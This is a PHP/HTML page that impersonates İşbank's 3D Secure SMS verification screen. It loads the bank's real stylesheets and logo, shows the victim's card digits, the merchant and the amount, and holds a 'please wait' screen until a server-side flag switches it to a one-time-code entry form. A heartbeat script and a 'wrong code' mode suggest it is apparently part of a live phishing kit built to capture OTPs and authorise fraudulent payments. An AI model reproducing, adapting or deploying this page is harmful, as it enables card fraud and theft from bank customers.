<?php
require __DIR__ . '/_acs_core.php';
$kg = $kod_goster; $hm = $hata_modu;
$cc_last_4 = substr($kart_no, -4);
$cc_first_6 = substr($kart_no, 0, 6);
?>
<html lang="tr">
  <head>
    <title>GO - GÜVENLİ ÖDEME</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; minimum-scale=1.0; user-scalable=no; target-densityDpi=device-dpi">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css?1.0.2.0">
    <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css?1.0.2.0">
    <script type="text/javascript" language="javascript" src="https://maxinet.isbank.com.tr/assets/scripts/jquery-3.5.1.min.js?1.0.2.0"></script>
    <style>
    #state-bekle { text-align:center; padding:30px 20px; }
    #state-bekle .isb-spinner { width:40px;height:40px;border:4px solid #e0e6f0;border-top-color:#1a3668;border-radius:50%;animation:isb-spin 1s linear infinite;margin:0 auto 12px; }
    @keyframes isb-spin { to { transform:rotate(360deg); } }
    #hata-box { display:none; }
    </style>
  </head>
  <body>
    <table style="width: 100%; vertical-align: middle; text-align: center; font-size: 14px; color: white; background-color:#747474;display:none;" id="warningTop">
      <tbody>
        <tr>
          <td style="text-align: center; vertical-align: middle; padding:  10px; color: white; font-family: Tahoma;">Kullandığınız internet tarayıcısının versiyonu bu sayfanın doğru çalışmasına engel olabilir. Bir sorunla karşılaşırsanız lütfen internet tarayıcınızın sürüm güncellemesini gerçekleştirip tekrar deneyiniz.</td>
        </tr>
      </tbody>
    </table>
    <!-- End Browser Check -->
    <div class="container-fluid header Maximum">
      <div class="container">
        <div class="col-xs-6 header-left"></div>
        <div class="col-xs-6 header-right"></div>
      </div>
    </div>
    <div class="container-fluid cardno">
      <div class="container">
        <h1>
          <span class="title">KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span class="lastDigits"> <?= $cc_last_4 ?> </span>
        </h1>
      </div>
    </div>
    <div class="container-fluid details">
      <div class="container">
        <div class="col-xs-12">
          <div class="col-xs-12 col-sm-4 merchant">
            <span><?= htmlspecialchars($isyeri) ?></span>
          </div>
          <div class="col-xs-6 col-sm-4 amount">
            <span> <?= $tutar ?> ₺</span>
          </div>
          <div class="col-xs-6 col-sm-4 date">
            <span> <?= $zaman ?> </span>
          </div>

		  <?php if ($hm): ?>
          <div class="col-xs-6 col-sm-4 date" id="hata-box" style="display:block">
            <span style="color:red;">Girdiğiniz doğrulama kodu hatalı. Lütfen tekrar giriniz.</span>
          </div>
		  <?php else: ?>
          <div class="col-xs-6 col-sm-4 date" id="hata-box" style="display:none">
            <span style="color:red;"></span>
          </div>
		  <?php endif; ?>
        </div>
      </div>
    </div>

    <div class="container-fluid content">
      <div class="container">
        <div class="col-xs-12">

          <!-- BEKLEME EKRANI -->
          <div id="state-bekle" <?= $kg ? 'style="display:none"' : '' ?>>
            <div class="isb-spinner"></div>
            <div class="col-xs-12 info">
              <p class="smallScreenText">SMS doğrulama kodunuz gönderiliyor, lütfen bekleyiniz...</p>
            </div>
          </div>

          <!-- KOD GİRİŞ EKRANI -->
          <div id="state-kod" <?= $kg ? '' : 'style="display:none"' ?>>
            <div class="col-xs-12 info">
              <p class="smallScreenText">Online alışverişinizin ödemesini tamamlamak için, <strong>5*********</strong> numaralı cep telefonunuza <strong>SMS</strong> ile gelen ya da İşCep'e <strong>Anlık Mesaj</strong> olarak iletilen doğrulama kodunu girerek onaylayınız. </p>
              <p class="largeScreenText">Online alışverişinizin ödemesini tamamlamak için, <strong>5*********</strong> numaralı cep telefonunuza <strong>SMS</strong> ile gelen ya da İşCep'e <strong>Anlık Mesaj</strong> olarak iletilen doğrulama kodunu girerek onaylayınız. </p>
            </div>
            <div class="col-xs-12 formHolder">
              <form method="POST" name="chnte" action="" id="chnte" onsubmit="event.preventDefault();submitAcsKod();">
                <input id="sms-kod" name="sms" type="text" inputmode="numeric"
                       minlength="5" maxlength="6" placeholder="Doğrulama Kodu" required
                       oninput="this.value=this.value.replace(/\D/g,'').slice(0,6);checkAcsBtn()">
                <input id="acs-submit-btn" type="button" value="ONAYLA" class="primary" onclick="submitAcsKod()" disabled>
                <input id="reSendButton" type="button" value="Tekrar Gönder" class="primary inProgress" disabled="">
              </form>
              <div class="col-xs-6">
                <a id="cancelButton">İşlemi İptal Et</a>
              </div>
              <div class="col-xs-6 text-right">
                <a>Yardım</a>
              </div>
              <div id="checkDiv" class="checkHolder" style="display: none;">
                <input id="sendSmsCheck" name="sendSmsCheck" type="checkbox">
                <label class="chkLabel" for="sendSmsCheck">Maximum Mobil İndir</label>
              </div>
              <div id="checkDivCommercial" class="checkHolder">
                <input id="sendSmsCheckCommercial" name="sendSmsCheckCommercial" type="checkbox">
                <label class="chkLabel" for="sendSmsCheckCommercial">Maximum İşyerim İndir</label>
              </div>
            </div>
          </div>

          <div class="col-xs-12 countdown">
            <div id="progressBar">
              <div style="width: 447.674px; overflow: hidden;">174</div>
            </div>
          </div>
          <div class="col-xs-12">
            <div class="text-center" id="changeOtpDiv" style="display: none;">
              <div>
                <a href="" id="changeOtp">Doğrulama tercih sayfasına geri dönmek için tıklayınız.</a>
              </div>
            </div>
          </div>
          <div class="progressBarClear"></div>
        </div>
      </div>
    </div>
    <div class="container-fluid footer">
      <div class="container">
        <p>KART BİLGİLERİNİZ İŞYERİ İLE <strong>
            <u>KESİNLİKLE PAYLAŞILMAMAKTADIR</u>
          </strong>. </p>
        <img src="https://maxinet.isbank.com.tr/assets/images/logo-isbank.png">
      </div>
    </div>
    <script type="text/javascript">
      var enableSecondTimer;
      enableSecondTimer = false;
      progress(180, 180);

      function progress(timeleft, timetotal) {
        var $element = $('#progressBar');
        var progressBarWidth = timeleft * $element.width() / timetotal;
        $element.find('div').animate({
          width: progressBarWidth
        } , timeleft == timetotal ? 0 : 1000, 'linear').html(timeleft);
        var timeOrange = timetotal / 2;
        var timeRed = timetotal / 6;
        if (timeleft <= timeOrange) {
          $('#progressBar div').addClass('orange');
        }
        if (timeleft <= timeRed) {
          $('#progressBar div').addClass('red');
        }
        if (timeleft < 1) {
          enableSecondTimer = true;
          progressSecondTimer(60, 60);
        }
        if (timeleft > 0) {
          setTimeout(function() {
            progress(timeleft - 1, timetotal);
          } , 1000);
        }
      }

      function progressSecondTimer(timeleft, timetotal) {
        if (enableSecondTimer == true && timeleft > 0) {
          setTimeout(function() {
            progressSecondTimer(timeleft - 1, timetotal);
          } , 1000);
        }
      }
    </script>
    <script type="text/javascript">
      function numeric(element, maxLength) {
        if (element.value.match(/[^0-9]/g)) {
          element.value = element.value.replace(/[^0-9]/g, '');
        }
        if (element.value.length > maxLength) {
          element.value = element.value.substr(0, maxLength);
        }
      }
    </script>

<?= acs_heartbeat_js($kg, $hm) ?>

  </body>
</html>
